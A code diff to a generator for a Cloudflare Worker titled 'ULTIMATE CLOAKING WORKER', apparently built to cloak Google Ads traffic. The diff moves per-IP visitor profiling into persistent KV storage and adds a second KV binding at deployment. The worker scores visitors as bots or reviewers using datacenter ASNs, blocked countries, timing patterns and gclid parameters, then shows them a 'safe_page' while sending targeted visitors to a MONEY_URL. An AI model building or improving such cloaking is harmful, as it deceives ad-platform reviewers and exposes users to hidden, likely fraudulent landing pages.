@@ -795,8 +795,9 @@ export function generateJciWorkerScript(options: {
   return `// ULTIMATE CLOAKING WORKER v3.1
 // USA-optimized bot detection with multi-layered scoring and cross-session intelligence
 
-// KV Namespace binding - TRAFFIC_LOGS is automatically bound by Cloudflare
-// when the worker is deployed with KV binding configuration
+// KV Namespace bindings - Both are automatically bound by Cloudflare when deployed:
+// - TRAFFIC_LOGS: For request logging and analytics
+// - INTELLIGENCE_STORE: For cross-session behavioral intelligence
 
 const TARGET_COUNTRIES = ${JSON.stringify(targetCountryCodes)};
 const MONEY_URL = '${moneyUrl}';
@@ -833,10 +834,7 @@ const DATACENTER_ASNS = [
 const BLOCKED_COUNTRIES = ['CN', 'RU', 'IN', 'PK', 'BD', 'VN', 'IR', 'KP', 'BY'];
 const requestTracker = new Map();
 
-// Cross-Session Intelligence Storage
-const intelligenceStore = new Map();
-
-// Background Intelligence Gathering
+// Background Intelligence Gathering using KV Storage for true persistence
 async function gatherIntelligence(request, ipData, decision) {
   try {
     const clientIP = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
@@ -846,16 +844,30 @@ async function gatherIntelligence(request, ipData, decision) {
     // Create intelligence key for this visitor
     const visitorKey = 'intel_' + clientIP.replace(/[^a-zA-Z0-9]/g, '_');
     
-    // Get existing intelligence or create new
-    let intel = intelligenceStore.get(visitorKey) || {
-      firstSeen: timestamp,
-      lastSeen: timestamp,
-      requestCount: 0,
-      decisions: [],
-      timingPatterns: [],
-      userAgents: new Set(),
-      behaviorFlags: []
-    };
+    // Get existing intelligence from dedicated Intelligence KV storage
+    // @ts-ignore - INTELLIGENCE_STORE is injected by Cloudflare Workers runtime with KV binding
+    const existingData = await INTELLIGENCE_STORE.get(visitorKey);
+    
+    let intel;
+    if (existingData) {
+      intel = JSON.parse(existingData);
+      // Convert userAgents array back to Set if it exists
+      if (intel.userAgents && Array.isArray(intel.userAgents)) {
+        intel.userAgents = new Set(intel.userAgents);
+      } else {
+        intel.userAgents = new Set();
+      }
+    } else {
+      intel = {
+        firstSeen: timestamp,
+        lastSeen: timestamp,
+        requestCount: 0,
+        decisions: [],
+        timingPatterns: [],
+        userAgents: new Set(),
+        behaviorFlags: []
+      };
+    }
     
     // Update intelligence
     intel.lastSeen = timestamp;
@@ -895,28 +907,30 @@ async function gatherIntelligence(request, ipData, decision) {
     
     intel.timingPatterns.push(timestamp);
     
-    // Keep only last 10 timing entries to manage memory
+    // Keep only last 10 timing entries to manage KV storage size
     if (intel.timingPatterns.length > 10) {
       intel.timingPatterns = intel.timingPatterns.slice(-10);
     }
     
-    // Keep only last 20 decisions
+    // Keep only last 20 decisions to manage storage size
     if (intel.decisions.length > 20) {
       intel.decisions = intel.decisions.slice(-20);
     }
     
-    // Store updated intelligence
-    intelligenceStore.set(visitorKey, intel);
+    // Keep only unique behavior flags (remove duplicates)
+    intel.behaviorFlags = [...new Set(intel.behaviorFlags)];
     
-    // Clean up old entries (every 100th request)
-    if (intel.requestCount % 100 === 0) {
-      const cutoffTime = timestamp - (24 * 60 * 60 * 1000); // 24 hours ago
-      for (const [key, data] of intelligenceStore.entries()) {
-        if (data.lastSeen < cutoffTime) {
-          intelligenceStore.delete(key);
-        }
-      }
-    }
+    // Prepare data for KV storage (convert Set to Array)
+    const kvData = {
+      ...intel,
+      userAgents: Array.from(intel.userAgents)
+    };
+    
+    // Store updated intelligence in dedicated Intelligence KV with 7 day expiration
+    // @ts-ignore - INTELLIGENCE_STORE is injected by Cloudflare Workers runtime with KV binding
+    await INTELLIGENCE_STORE.put(visitorKey, JSON.stringify(kvData), {
+      expirationTtl: 7 * 24 * 60 * 60 // Keep intelligence for 7 days
+    });
     
   } catch (error) {
     // Don't let intelligence gathering break main flow
@@ -924,35 +938,49 @@ async function gatherIntelligence(request, ipData, decision) {
   }
 }
 
-// Enhanced Bot Score Calculation with Intelligence
-function calculateIntelligenceScore(clientIP) {
-  const visitorKey = 'intel_' + clientIP.replace(/[^a-zA-Z0-9]/g, '_');
-  const intel = intelligenceStore.get(visitorKey);
-  
-  if (!intel) return 0;
-  
-  let intelScore = 0;
-  
-  // Behavioral flag scoring
-  if (intel.behaviorFlags.includes('rapid_requests')) intelScore += 15;
-  if (intel.behaviorFlags.includes('inhuman_speed')) intelScore += 20;
-  if (intel.behaviorFlags.includes('mechanical_timing')) intelScore += 25;
-  
-  // Multiple user agents = suspicious
-  if (intel.userAgents.size > 3) intelScore += 10;
-  
-  // High request count in short time
-  const sessionDuration = intel.lastSeen - intel.firstSeen;
-  if (sessionDuration < 300000 && intel.requestCount > 10) { // 5 minutes, >10 requests
-    intelScore += 15;
+// Enhanced Bot Score Calculation with KV-based Intelligence
+async function calculateIntelligenceScore(clientIP) {
+  try {
+    const visitorKey = 'intel_' + clientIP.replace(/[^a-zA-Z0-9]/g, '_');
+    
+    // Get intelligence from dedicated Intelligence KV storage
+    // @ts-ignore - INTELLIGENCE_STORE is injected by Cloudflare Workers runtime with KV binding
+    const existingData = await INTELLIGENCE_STORE.get(visitorKey);
+    
+    if (!existingData) return 0;
+    
+    const intel = JSON.parse(existingData);
+    let intelScore = 0;
+    
+    // Behavioral flag scoring
+    if (intel.behaviorFlags && intel.behaviorFlags.includes('rapid_requests')) intelScore += 15;
+    if (intel.behaviorFlags && intel.behaviorFlags.includes('inhuman_speed')) intelScore += 20;
+    if (intel.behaviorFlags && intel.behaviorFlags.includes('mechanical_timing')) intelScore += 25;
+    
+    // Multiple user agents = suspicious
+    if (intel.userAgents && intel.userAgents.length > 3) intelScore += 10;
+    
+    // High request count in short time
+    if (intel.firstSeen && intel.lastSeen && intel.requestCount) {
+      const sessionDuration = intel.lastSeen - intel.firstSeen;
+      if (sessionDuration < 300000 && intel.requestCount > 10) { // 5 minutes, >10 requests
+        intelScore += 15;
+      }
+    }
+    
+    // Consistent bot decisions
+    if (intel.decisions && intel.decisions.length >= 5) {
+      const recentDecisions = intel.decisions.slice(-5);
+      const botDecisions = recentDecisions.filter(d => d.decision === 'safe_page').length;
+      if (botDecisions >= 4) intelScore += 20;
+    }
+    
+    return Math.min(intelScore, 30); // Cap at 30 points from intelligence
+    
+  } catch (error) {
+    console.error('Intelligence calculation error:', error);
+    return 0; // Return 0 on error to avoid breaking detection
   }
-  
-  // Consistent bot decisions
-  const recentDecisions = intel.decisions.slice(-5);
-  const botDecisions = recentDecisions.filter(d => d.decision === 'safe_page').length;
-  if (botDecisions >= 4) intelScore += 20;
-  
-  return Math.min(intelScore, 30); // Cap at 30 points from intelligence
 }
 // --- END CONFIGURATION ---
 
@@ -1271,7 +1299,7 @@ async function isVisitorABot(request) {
     const activeParam = gclid || gbraid || wbraid;
     
     // Add intelligence-based scoring from previous behavior
-    const intelligenceScore = calculateIntelligenceScore(clientIP);
+    const intelligenceScore = await calculateIntelligenceScore(clientIP);
     botScore += intelligenceScore;
     
     if (activeParam) {
@@ -2111,12 +2139,24 @@ No domains found in your Cloudflare account. Please add ${rootDomain} to your Cl
       excludeCountries
     });
     
-    // 5. Deploy worker to Cloudflare with TRAFFIC_LOGS KV binding
-    console.log(`Creating worker script with KV binding: ${scriptName}`);
-    const kvBindings = [{
-      name: 'TRAFFIC_LOGS',
-      namespace_id: '0b5157572fe24cc092500d70954ab67e'
-    }];
+    // 5. Deploy worker to Cloudflare with both KV bindings
+    console.log(`Creating worker script with KV bindings: ${scriptName}`);
+    
+    // Validate that INTELLIGENCE_STORE_NAMESPACE_ID is set
+    if (!process.env.INTELLIGENCE_STORE_NAMESPACE_ID) {
+      throw new Error('INTELLIGENCE_STORE_NAMESPACE_ID environment variable is required for cross-session intelligence');
+    }
+    
+    const kvBindings = [
+      {
+        name: 'TRAFFIC_LOGS',
+        namespace_id: '0b5157572fe24cc092500d70954ab67e'
+      },
+      {
+        name: 'INTELLIGENCE_STORE',
+        namespace_id: process.env.INTELLIGENCE_STORE_NAMESPACE_ID
+      }
+    ];
     
     const workerResult = await cf.createWorkerWithKVBinding(scriptName, workerScript, kvBindings);
     
